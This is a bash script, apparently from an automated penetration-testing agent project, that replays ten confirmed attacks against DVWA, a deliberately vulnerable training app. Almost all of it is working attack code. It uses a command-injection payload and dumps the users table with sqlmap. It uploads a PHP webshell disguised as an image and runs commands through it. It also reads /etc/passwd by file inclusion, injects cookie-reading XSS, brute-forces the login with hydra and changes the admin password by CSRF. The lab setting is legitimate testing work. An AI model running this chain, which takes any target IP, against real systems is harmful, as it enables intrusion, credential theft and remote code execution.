#!/usr/bin/env bash
# dvwa_full_chain.sh -- reusable, parameterized re-run of the 10 confirmed
# DVWA vulnerability techniques from
# reports/stage4_patient_zero_dvwa_20260917.md.
#
# THIS IS A RECORD OF WHAT WORKED, NOT A DEMONSTRATION OF OUR SCRIPTED
# SYSTEM. It calls the raw kali tool binaries directly (curl/hydra/sqlmap/
# john), the same way this session's manual investigation did -- it does
# NOT go through tools.py's ToolExecutor. That's deliberate: tools.py's
# current _run_curl/_run_sqlmap/_run_hydra cannot reproduce most of these
# steps at all (no cookie/session support in curl or sqlmap, no
# http-post-form/http-get-form mode in hydra -- see
# kali-network-model-<TBD> for the tracked gaps). This script exists so the
# exact commands are preserved and re-runnable, both as a regression check
# against DVWA-alikes and as the concrete spec for what tools.py needs to
# grow before it can do this itself.
#
# Run from inside kali-agent-box (or any box with these tools installed):
#   ./dvwa_full_chain.sh <target-ip> [restore-password]
#
# restore-password (default: password) is what admin's password gets set
# back to after the CSRF step, so re-running this script stays idempotent.
set -uo pipefail

TARGET="${1:?Usage: $0 <target-ip> [login-password] [restore-password]}"
LOGIN_PW="${2:-password}"
RESTORE_PW="${3:-password}"
BASE="http://${TARGET}"
COOKIE_JAR="$(mktemp)"
trap 'rm -f "$COOKIE_JAR"' EXIT

echo "=== [0/10] Auth: admin/${LOGIN_PW} ==="
LOGIN_PAGE=$(curl -s -c "$COOKIE_JAR" --max-time 5 "$BASE/login.php")
TOKEN=$(echo "$LOGIN_PAGE" | grep -oP "user_token.\s*value=.\K[a-f0-9]+")
LOGIN_RESULT=$(curl -s -i -b "$COOKIE_JAR" -c "$COOKIE_JAR" --max-time 5 \
  -d "username=admin&password=${LOGIN_PW}&Login=Login&user_token=$TOKEN" \
  "$BASE/login.php" | grep -i "^location")
# DO NOT assume success -- this exact assumption (a claimed-but-unverified
# password restore) silently broke this script during its own first test
# run: the real live password had drifted to a leftover test value from an
# earlier, unrelated CSRF check, and every step after a failed login here
# produced empty output instead of a clear error. Verify explicitly instead.
if ! echo "$LOGIN_RESULT" | grep -qi "index.php"; then
  echo "FATAL: login as admin/${LOGIN_PW} failed (got: ${LOGIN_RESULT:-no redirect}). Aborting -- every step below requires a real session." >&2
  echo "If the live password has drifted (e.g. from a prior CSRF test), pass it as \$2: $0 $TARGET <real-current-password>" >&2
  exit 1
fi
echo "session established and verified (cookie jar: $COOKIE_JAR)"

echo
echo "=== [1/10] Command Injection (/vulnerabilities/exec/) ==="
curl -s -b "$COOKIE_JAR" --max-time 5 \
  --data-urlencode "ip=127.0.0.1; whoami; id; uname -a" \
  --data-urlencode "Submit=Submit" \
  "$BASE/vulnerabilities/exec/" | sed -n '/pre>/,/\/pre/p'

echo
echo "=== [2/10] SQL Injection -- sqlmap dump + crack (/vulnerabilities/sqli/) ==="
SESS=$(grep -oP 'PHPSESSID\t\K\S+' "$COOKIE_JAR")
sqlmap -u "$BASE/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=${SESS}; security=low" \
  --batch -D dvwa -T users -C user,password --dump 2>&1 | tail -15
echo "--- crack dumped hashes with john if you saved them to a file, e.g.: ---"
echo "john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt dvwa_hashes.txt"

echo
echo "=== [3/10] Unrestricted File Upload -- webshell RCE (/vulnerabilities/upload/) ==="
SHELL_TMP=$(mktemp --suffix=.php)
echo '<?php system($_GET["cmd"]); ?>' > "$SHELL_TMP"
curl -s -b "$COOKIE_JAR" --max-time 5 \
  -F "MAX_FILE_SIZE=100000" \
  -F "uploaded=@${SHELL_TMP};filename=shell.php;type=image/jpeg" \
  -F "Upload=Upload" \
  "$BASE/vulnerabilities/upload/" | grep -iE "succe|hackable"
rm -f "$SHELL_TMP"
echo "--- verify RCE ---"
curl -s --max-time 5 "$BASE/hackable/uploads/shell.php?cmd=id;hostname"

echo
echo "=== [4/10] Local File Inclusion (/vulnerabilities/fi/) ==="
curl -s -b "$COOKIE_JAR" --max-time 5 "$BASE/vulnerabilities/fi/?page=../../../../../../etc/passwd" | head -5

echo
echo "=== [5/10] Reflected XSS (/vulnerabilities/xss_r/) ==="
curl -s -b "$COOKIE_JAR" -G --max-time 5 --data-urlencode "name=<script>alert(1)</script>" "$BASE/vulnerabilities/xss_r/" | grep -o "<script>alert(1)</script>"

echo
echo "=== [6/10] Stored XSS (/vulnerabilities/xss_s/) ==="
curl -s -b "$COOKIE_JAR" --max-time 5 \
  --data-urlencode "txtName=pentest" \
  --data-urlencode "mtxMessage=<script>alert(document.cookie)</script>" \
  --data-urlencode "btnSign=Sign Guestbook" \
  "$BASE/vulnerabilities/xss_s/" -o /dev/null
curl -s -b "$COOKIE_JAR" --max-time 5 "$BASE/vulnerabilities/xss_s/" | grep -o "<script>alert(document.cookie)</script>"

echo
echo "=== [7/10] Brute Force -- hydra http-get-form (/vulnerabilities/brute/) ==="
echo "NOTE: field order matters -- H= must come BEFORE F=/S=, and the URL"
echo "path + query params must be two SEPARATE colon fields even for GET."
hydra -l admin -P /usr/share/seclists/Passwords/Common-Credentials/darkweb2017_top-1000.txt "$TARGET" http-get-form \
  "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\: PHPSESSID=${SESS}; security=low:S=Welcome to the password protected area" \
  -t 8

echo
echo "=== [8/10] CSRF -- unauthenticated-looking password change (/vulnerabilities/csrf/) ==="
curl -s -b "$COOKIE_JAR" -G --max-time 5 --data-urlencode "password_new=csrf_proof" --data-urlencode "password_conf=csrf_proof" --data-urlencode "Change=Change" "$BASE/vulnerabilities/csrf/" | grep -o "Password Changed."
echo "restoring password to '$RESTORE_PW'..."
curl -s -b "$COOKIE_JAR" -G --max-time 5 --data-urlencode "password_new=${RESTORE_PW}" --data-urlencode "password_conf=${RESTORE_PW}" --data-urlencode "Change=Change" "$BASE/vulnerabilities/csrf/" -o /dev/null

echo
echo "=== [9/10] Weak Session IDs (/vulnerabilities/weak_id/) ==="
for i in 1 2 3; do
  curl -s -i -b "$COOKIE_JAR" --max-time 5 -d "" "$BASE/vulnerabilities/weak_id/" | grep -i "^set-cookie: dvwasession"
done

echo
echo "=== [10/10] SQL Injection (Blind) -- sqlmap (/vulnerabilities/sqli_blind/) ==="
echo "NOTE: hand-crafted boolean payloads (1 AND 1=1 / 1 AND 1=2, raw and"
echo "quoted) produced IDENTICAL responses and looked like a dead end here."
echo "sqlmap found it immediately anyway -- don't trust a manual dead end."
sqlmap -u "$BASE/vulnerabilities/sqli_blind/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=${SESS}; security=low" \
  --batch --level=2 2>&1 | tail -12

echo
echo "=== Done: 10/10 techniques re-run against ${TARGET} ==="
